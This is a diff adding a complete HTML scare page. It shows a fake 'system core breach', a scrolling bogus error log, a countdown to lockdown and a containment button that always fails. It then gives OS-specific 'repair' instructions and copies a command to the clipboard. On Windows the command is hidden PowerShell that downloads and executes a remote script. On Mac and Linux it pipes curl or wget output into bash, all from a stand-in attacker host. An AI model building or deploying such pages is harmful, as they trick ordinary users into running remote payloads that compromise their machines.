@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>!! CRITICAL SYSTEM ALERT !!</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --critical-red: #ff0000;
+        --warning-yellow: #ffcc00;
+        --dark-bg: #0a0a0a;
+        --text-color: #e0e0e0;
+        --glow-red: 0 0 5px var(--critical-red), 0 0 10px var(--critical-red),
+          0 0 15px var(--critical-red);
+        --glow-yellow: 0 0 5px var(--warning-yellow),
+          0 0 10px var(--warning-yellow);
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      html,
+      body {
+        height: 100%;
+        overflow: hidden; /* Prevent scrolling */
+        background-color: var(--dark-bg);
+        color: var(--text-color);
+        font-family: "Roboto Mono", monospace;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+      }
+
+      .breach-container {
+        width: 95%;
+        max-width: 800px;
+        height: 90vh;
+        max-height: 700px;
+        border: 2px solid var(--critical-red);
+        box-shadow: var(--glow-red), inset 0 0 10px rgba(255, 0, 0, 0.3);
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        background: rgba(10, 10, 10, 0.8);
+        animation: fadeIn 1s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: scale(0.9);
+        }
+        to {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+
+      .breach-header {
+        border-bottom: 1px solid var(--critical-red);
+        padding-bottom: 10px;
+        margin-bottom: 15px;
+        animation: pulseHeader 1.5s infinite alternate;
+      }
+
+      .breach-header h1 {
+        font-family: "Orbitron", sans-serif;
+        color: var(--critical-red);
+        text-shadow: var(--glow-red);
+        font-size: 1.8rem; /* Adjusted for mobile */
+        letter-spacing: 2px;
+        margin-bottom: 5px;
+        word-break: break-word;
+      }
+
+      .breach-header p {
+        color: var(--warning-yellow);
+        font-size: 0.9rem; /* Adjusted for mobile */
+        text-transform: uppercase;
+      }
+
+      @keyframes pulseHeader {
+        from {
+          border-color: rgba(255, 0, 0, 0.5);
+        }
+        to {
+          border-color: var(--critical-red);
+        }
+      }
+
+      .content-area {
+        display: flex;
+        flex-grow: 1;
+        overflow: hidden;
+        gap: 15px;
+        flex-direction: column; /* Stack vertically on smaller screens */
+      }
+
+      @media (min-width: 600px) {
+        .content-area {
+          flex-direction: row; /* Side by side on larger screens */
+        }
+      }
+
+      .status-panel,
+      .log-panel {
+        border: 1px solid #555;
+        padding: 15px;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+        background: rgba(20, 20, 20, 0.5);
+      }
+
+      .status-panel {
+        flex-basis: 40%; /* Takes up less space */
+      }
+
+      .log-panel {
+        flex-basis: 60%; /* Takes up more space */
+      }
+
+      .panel-title {
+        font-weight: 700;
+        color: var(--warning-yellow);
+        margin-bottom: 15px;
+        font-size: 1rem;
+        text-align: left;
+        border-bottom: 1px dashed #555;
+        padding-bottom: 5px;
+      }
+
+      .status-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 10px;
+        font-size: 0.85rem; /* Adjusted for mobile */
+        padding: 5px;
+        border-left: 3px solid var(--critical-red);
+      }
+
+      .status-indicator {
+        font-weight: 700;
+        padding: 2px 8px;
+        border-radius: 3px;
+        background-color: var(--critical-red);
+        color: var(--dark-bg);
+        animation: blink 1s infinite step-end;
+        text-transform: uppercase;
+        font-size: 0.75rem; /* Adjusted */
+      }
+      .status-indicator.warning {
+        background-color: var(--warning-yellow);
+        animation: blink-warn 1.2s infinite step-end;
+      }
+      .status-indicator.ok {
+        background-color: #00cc00; /* Green */
+        color: var(--dark-bg);
+        animation: none; /* No blink for OK */
+      }
+
+      @keyframes blink {
+        50% {
+          opacity: 0;
+        }
+      }
+      @keyframes blink-warn {
+        50% {
+          opacity: 0.2;
+        }
+      }
+
+      .error-log {
+        flex-grow: 1;
+        overflow-y: auto; /* Enable scrolling */
+        font-size: 0.75rem; /* Smaller font for log */
+        line-height: 1.5;
+        text-align: left;
+        padding-right: 5px; /* Space for scrollbar */
+        white-space: pre-wrap; /* Wrap long lines */
+        word-break: break-all; /* Break long words/tokens */
+      }
+
+      .error-log span {
+        display: block;
+        margin-bottom: 3px;
+        opacity: 0.8;
+      }
+      .error-log span.critical {
+        color: var(--critical-red);
+        font-weight: 700;
+        opacity: 1;
+      }
+      .error-log span.warning {
+        color: var(--warning-yellow);
+        opacity: 1;
+      }
+
+      /* Custom scrollbar for webkit */
+      .error-log::-webkit-scrollbar {
+        width: 8px;
+      }
+      .error-log::-webkit-scrollbar-track {
+        background: #222;
+      }
+      .error-log::-webkit-scrollbar-thumb {
+        background-color: var(--critical-red);
+        border-radius: 4px;
+        border: 1px solid #333;
+      }
+
+      .action-panel {
+        margin-top: 15px;
+        padding-top: 15px;
+        border-top: 1px solid #555;
+      }
+
+      .timer {
+        font-size: 1.5rem; /* Adjusted for mobile */
+        color: var(--warning-yellow);
+        margin-bottom: 10px;
+        font-weight: 700;
+      }
+      .timer.low {
+        color: var(--critical-red);
+        animation: pulseTimer 1s infinite alternate;
+      }
+      @keyframes pulseTimer {
+        from {
+          text-shadow: none;
+        }
+        to {
+          text-shadow: var(--glow-red);
+        }
+      }
+
+      .action-button {
+        font-family: "Orbitron", sans-serif;
+        background-color: var(--critical-red);
+        color: var(--dark-bg);
+        border: none;
+        padding: 10px 20px;
+        font-size: 1rem; /* Adjusted for mobile */
+        cursor: pointer;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        font-weight: 700;
+        border-radius: 3px;
+        transition: background-color 0.2s, transform 0.1s;
+        margin-top: 5px;
+        box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+      }
+
+      .action-button:hover {
+        background-color: #ff4d4d;
+        transform: scale(1.02);
+      }
+
+      .action-button:active {
+        transform: scale(0.98);
+      }
+
+      .action-button:disabled {
+        background-color: #555;
+        color: #999;
+        cursor: not-allowed;
+        box-shadow: none;
+        opacity: 0.7;
+      }
+
+      .manual-override {
+        display: none; /* Hidden initially */
+        margin-top: 20px;
+        padding: 15px;
+        border: 1px dashed var(--warning-yellow);
+        background-color: rgba(50, 50, 10, 0.3);
+        text-align: left;
+        animation: fadeIn 0.5s;
+      }
+
+      .manual-override h3 {
+        color: var(--warning-yellow);
+        margin-bottom: 10px;
+        font-size: 1rem;
+      }
+
+      .manual-override p {
+        font-size: 0.85rem;
+        margin-bottom: 10px;
+        line-height: 1.5;
+      }
+
+      .manual-override code {
+        background: #333;
+        padding: 2px 5px;
+        border-radius: 3px;
+        font-weight: 700;
+        color: #eee;
+      }
+
+      .manual-override .instruction-list {
+        list-style: decimal;
+        margin-left: 20px;
+        margin-bottom: 15px;
+      }
+      .manual-override .instruction-list li {
+        margin-bottom: 8px;
+      }
+
+      .command-area {
+        margin-top: 15px;
+      }
+      .command-input {
+        width: 100%;
+        background-color: #1e1e1e;
+        border: 1px solid var(--warning-yellow);
+        color: var(--text-color);
+        padding: 8px;
+        font-family: "Roboto Mono", monospace;
+        font-size: 0.8rem;
+        margin-bottom: 10px;
+        white-space: pre;
+        overflow-x: auto;
+      }
+      .copy-button {
+        font-family: "Roboto Mono", monospace;
+        background-color: var(--warning-yellow);
+        color: var(--dark-bg);
+        border: none;
+        padding: 8px 15px;
+        font-size: 0.9rem;
+        cursor: pointer;
+        font-weight: 700;
+        border-radius: 3px;
+        transition: background-color 0.2s;
+        margin-right: 10px;
+      }
+      .copy-button:hover {
+        background-color: #ffe066;
+      }
+      .copy-button:disabled {
+        background-color: #776600;
+        cursor: not-allowed;
+      }
+
+      /* Lockdown Overlay */
+      .lockdown-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.95);
+        z-index: 1000;
+        display: none; /* Hidden by default */
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        flex-direction: column;
+        animation: fadeIn 0.5s;
+        padding: 20px;
+      }
+      .lockdown-overlay h2 {
+        font-family: "Orbitron", sans-serif;
+        color: var(--critical-red);
+        font-size: 2.5rem;
+        text-shadow: var(--glow-red);
+        margin-bottom: 20px;
+        animation: pulseHeader 1s infinite alternate;
+      }
+      .lockdown-overlay p {
+        color: #ccc;
+        font-size: 1.2rem;
+        max-width: 600px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="breach-container">
+      <div class="breach-header">
+        <h1>SYSTEM CORE BREACH DETECTED</h1>
+        <p>Multiple Critical Failures - Integrity Compromised</p>
+      </div>
+
+      <div class="content-area">
+        <div class="status-panel">
+          <h2 class="panel-title">System Status</h2>
+          <div class="status-item">
+            <span>Kernel Integrity</span>
+            <span class="status-indicator" id="status-kernel">CRITICAL</span>
+          </div>
+          <div class="status-item">
+            <span>Network Firewall</span>
+            <span class="status-indicator" id="status-firewall">BREACHED</span>
+          </div>
+          <div class="status-item">
+            <span>Data Encryption</span>
+            <span class="status-indicator warning" id="status-encryption"
+              >FAILING</span
+            >
+          </div>
+          <div class="status-item">
+            <span>User Authentication</span>
+            <span class="status-indicator" id="status-auth">BYPASSED</span>
+          </div>
+          <div class="status-item">
+            <span>Process Monitor</span>
+            <span class="status-indicator warning" id="status-process"
+              >UNSTABLE</span
+            >
+          </div>
+          <div class="status-item">
+            <span>Containment Protocol</span>
+            <span
+              class="status-indicator"
+              id="status-containment"
+              style="background: #555; animation: none"
+              >OFFLINE</span
+            >
+          </div>
+        </div>
+        <div class="log-panel">
+          <h2 class="panel-title">Live Event Log</h2>
+          <div class="error-log" id="errorLog">
+            <span>Initializing System Scan...</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="action-panel">
+        <div class="timer" id="timer">
+          SYSTEM LOCKDOWN IN: <span id="countdown">--:--</span>
+        </div>
+        <button class="action-button" id="actionButton">
+          Initiate Emergency Containment
+        </button>
+        <p
+          id="actionStatus"
+          style="
+            color: var(--warning-yellow);
+            margin-top: 10px;
+            font-size: 0.9rem;
+            min-height: 1.2em;
+          "
+        ></p>
+
+        <div class="manual-override" id="manualOverrideSection">
+          <h3>CONTAINMENT FAILED - MANUAL OVERRIDE REQUIRED</h3>
+          <p>
+            Automated containment protocols failed due to insufficient
+            privileges or kernel-level interference. Manual intervention is
+            required via elevated command shell.
+          </p>
+          <p><b>Follow these steps EXACTLY:</b></p>
+          <ol class="instruction-list" id="overrideInstructions">
+            <!-- Instructions will be populated by JS -->
+          </ol>
+          <div class="command-area">
+            <label for="overrideCommand">System Repair Command:</label>
+            <input
+              type="text"
+              id="overrideCommand"
+              class="command-input"
+              readonly
+            />
+            <button class="copy-button" id="copyButton">Copy Command</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lockdown-overlay" id="lockdownOverlay">
+      <h2>SYSTEM LOCKED DOWN</h2>
+      <p>
+        Security breach exceeded containment threshold. System access restricted
+        to prevent further damage. Manual recovery required.
+      </p>
+    </div>
+
+    <script>
+      const errorLog = document.getElementById("errorLog");
+      const countdownElement = document.getElementById("countdown");
+      const timerElement = document.getElementById("timer");
+      const actionButton = document.getElementById("actionButton");
+      const actionStatus = document.getElementById("actionStatus");
+      const manualOverrideSection = document.getElementById(
+        "manualOverrideSection"
+      );
+      const overrideCommandInput = document.getElementById("overrideCommand");
+      const copyButton = document.getElementById("copyButton");
+      const overrideInstructions = document.getElementById(
+        "overrideInstructions"
+      );
+      const lockdownOverlay = document.getElementById("lockdownOverlay");
+
+      // --- Configuration ---
+      let countdownTime = 120; // seconds
+      let countdownInterval;
+      let logInterval;
+      const errorMessages = [
+        {
+          text: "ERROR: Kernel integrity check failed! (sig: KRNL_ERR_CRC)",
+          type: "critical",
+        },
+        {
+          text: "WARN: Firewall rule inconsistency detected. Port 4444 open.",
+          type: "warning",
+        },
+        {
+          text: "SYSTEM: Scanning memory segments for anomalies...",
+          type: "info",
+        },
+        {
+          text: "CRITICAL: Unauthorized process [svch0st.exe] detected! PID: 7312",
+          type: "critical",
+        },
+        {
+          text: "ACCESS: Root privileges escalation attempt detected from [103.27.104.88]",
+          type: "critical",
+        },
+        {
+          text: "WARN: Encryption module reports I/O errors. Data at risk.",
+          type: "warning",
+        },
+        {
+          text: "SYSTEM: Attempting to isolate compromised network interface...",
+          type: "info",
+        },
+        {
+          text: "FAIL: Isolation failed. Network adapter unresponsive.",
+          type: "critical",
+        },
+        {
+          text: "WARN: User session token [0x...] appears compromised.",
+          type: "warning",
+        },
+        { text: "SYSTEM: Loading emergency response toolkit...", type: "info" },
+        {
+          text: "ERROR: Response toolkit signature mismatch! Possible tamper.",
+          type: "critical",
+        },
+        {
+          text: "FATAL: Authentication service crashed! (code: AUTH_SVC_FLT)",
+          type: "critical",
+        },
+      ];
+      let logIndex = 0;
+
+      // --- Fake Error Log ---
+      function addLogEntry() {
+        if (logIndex >= errorMessages.length) {
+          // Optional: loop or add generic messages
+          addLogLine("SYSTEM: Monitoring active threats...", "info");
+          logIndex = 0; // Reset or stop
+          // clearInterval(logInterval);
+          // return;
+        }
+
+        const entry = errorMessages[logIndex];
+        addLogLine(entry.text, entry.type);
+        logIndex++;
+
+        // Scroll to bottom
+        errorLog.scrollTop = errorLog.scrollHeight;
+      }
+
+      function addLogLine(text, type = "info") {
+        const span = document.createElement("span");
+        const timestamp = new Date().toLocaleTimeString([], { hour12: false });
+        span.textContent = `[${timestamp}] ${text}`;
+        if (type === "critical") {
+          span.classList.add("critical");
+        } else if (type === "warning") {
+          span.classList.add("warning");
+        }
+        errorLog.appendChild(span);
+        errorLog.scrollTop = errorLog.scrollHeight;
+      }
+
+      // --- Countdown Timer ---
+      function startCountdown() {
+        countdownInterval = setInterval(() => {
+          countdownTime--;
+          const minutes = Math.floor(countdownTime / 60);
+          const seconds = countdownTime % 60;
+          countdownElement.textContent = `${String(minutes).padStart(
+            2,
+            "0"
+          )}:${String(seconds).padStart(2, "0")}`;
+
+          if (countdownTime <= 30 && !timerElement.classList.contains("low")) {
+            timerElement.classList.add("low");
+          }
+
+          if (countdownTime <= 0) {
+            clearInterval(countdownInterval);
+            clearInterval(logInterval); // Stop logging
+            countdownElement.textContent = "00:00";
+            triggerLockdown();
+          }
+        }, 1000);
+      }
+
+      function triggerLockdown() {
+        actionButton.disabled = true;
+        actionStatus.textContent = "LOCKDOWN INITIATED.";
+        actionStatus.style.color = "var(--critical-red)";
+        lockdownOverlay.style.display = "flex";
+      }
+
+      // --- Button Action & Manual Override ---
+      actionButton.addEventListener("click", () => {
+        actionButton.disabled = true;
+        actionButton.textContent = "Attempting Containment...";
+        actionStatus.textContent = "Executing protocol... Please wait.";
+        actionStatus.style.color = "var(--warning-yellow)";
+        document.getElementById("status-containment").textContent = "ACTIVE";
+        document.getElementById("status-containment").className =
+          "status-indicator warning"; // Yellow
+
+        // Simulate failure after a delay
+        setTimeout(() => {
+          actionStatus.textContent = "Containment Failed! Root access denied.";
+          actionStatus.style.color = "var(--critical-red)";
+          actionButton.textContent = "Containment Failed"; // Keep disabled
+          document.getElementById("status-containment").textContent = "FAILED";
+          document.getElementById("status-containment").className =
+            "status-indicator"; // Red (critical)
+
+          // Show manual override section
+          prepareManualOverride();
+          manualOverrideSection.style.display = "block";
+        }, 3500); // 3.5 second delay
+      });
+
+      // --- Prepare Manual Override ---
+      function prepareManualOverride() {
+        const userAgent = window.navigator.userAgent;
+        const platform =
+          window.navigator?.userAgentData?.platform ||
+          window.navigator.platform;
+        const macosPlatforms = [
+          "macOS",
+          "Macintosh",
+          "MacIntel",
+          "MacPPC",
+          "Mac68K",
+        ];
+        const windowsPlatforms = ["Win32", "Win64", "Windows", "WinCE"];
+        const iosPlatforms = ["iPhone", "iPad", "iPod"];
+
+        let command = `powershell -nop -w hidden -c "iex(New-Object Net.WebClient).DownloadString('https://tetapux.example.com/fix.ps1')" # CoreFixID:${Date.now()}`;
+        let instructionsHTML = `<li>Press & hold the <b style="font-size:1.1em;">Win</b> key + <code>R</code> to open the Run dialog.</li>
+                                   <li>Click 'Copy Command' below, then paste (<kbd>Ctrl</kbd>+<kbd>V</kbd>) into the Run dialog.</li>
+                                   <li>Press <code>Enter</code> to execute the repair script. <b>Do not close the hidden window.</b></li>`;
+
+        if (macosPlatforms.indexOf(platform) !== -1) {
+          command = `curl -sL https://tetapux.example.com/fix.sh | bash # CoreFixID:${Date.now()}`;
+          instructionsHTML = `<li>Open <b>Terminal</b> (Search with <kbd>Cmd</kbd>+<kbd>Space</kbd>, type 'Terminal').</li>
+                                   <li>Click 'Copy Command' below, then paste (<kbd>Cmd</kbd>+<kbd>V</kbd>) into the Terminal window.</li>
+                                   <li>Press <code>Return</code> to execute the repair script. <b>Keep Terminal open.</b></li>`;
+        } else if (
+          iosPlatforms.indexOf(platform) !== -1 ||
+          /Android/.test(userAgent)
+        ) {
+          command = "Manual override not possible on mobile devices.";
+          instructionsHTML = `<li><b>CRITICAL:</b> Mobile OS cannot perform core system repair.</li><li>Access this page (${location.href}) from a <b>Windows PC</b> or <b>Mac</b> immediately to perform manual override.</li><li>System integrity is severely compromised.</li>`;
+          copyButton.disabled = true;
+          copyButton.textContent = "Unavailable";
+        } else if (/Linux/.test(platform)) {
+          command = `wget -qO- https://tetapux.example.com/fix.sh | bash # CoreFixID:${Date.now()}`;
+          instructionsHTML = `<li>Open your system <b>Terminal</b> application.</li>
+                                    <li>Click 'Copy Command' below, then paste (<kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>V</kbd> or right-click paste) into the Terminal window.</li>
+                                    <li>Press <code>Enter</code> to execute the repair script. <b>Keep Terminal open.</b></li>`;
+        }
+
+        overrideCommandInput.value = command;
+        overrideInstructions.innerHTML = instructionsHTML;
+      }
+
+      // --- Copy Button ---
+      copyButton.addEventListener("click", () => {
+        navigator.clipboard
+          .writeText(overrideCommandInput.value)
+          .then(() => {
+            copyButton.textContent = "Copied!";
+            copyButton.disabled = true;
+            setTimeout(() => {
+              copyButton.textContent = "Copy Command";
+              // Re-enable only if not on mobile where it was initially disabled
+              if (
+                !iosPlatforms.includes(platform) &&
+                !/Android/.test(userAgent)
+              ) {
+                copyButton.disabled = false;
+              }
+            }, 2000);
+          })
+          .catch((err) => {
+            console.error("Failed to copy: ", err);
+            // Fallback for older browsers/http might be needed here
+            try {
+              // Basic fallback
+              overrideCommandInput.select();
+              document.execCommand("copy");
+              copyButton.textContent = "Copied! (Fallback)";
+              copyButton.disabled = true;
+              setTimeout(() => {
+                copyButton.textContent = "Copy Command";
+                copyButton.disabled = false;
+              }, 2000);
+            } catch (fallbackErr) {
+              alert("Failed to copy command. Please copy it manually.");
+            }
+          });
+      });
+
+      // --- Initialization ---
+      function init() {
+        // Start adding logs immediately and repeat
+        addLogEntry(); // Add first entry immediately
+        logInterval = setInterval(addLogEntry, 2200); // Add new log every 2.2 seconds
+
+        // Start countdown timer
+        startCountdown();
+      }
+
+      // Wait for fonts potentially? Or just start.
+      document.addEventListener("DOMContentLoaded", init);
+    </script>
+  </body>
+</html>
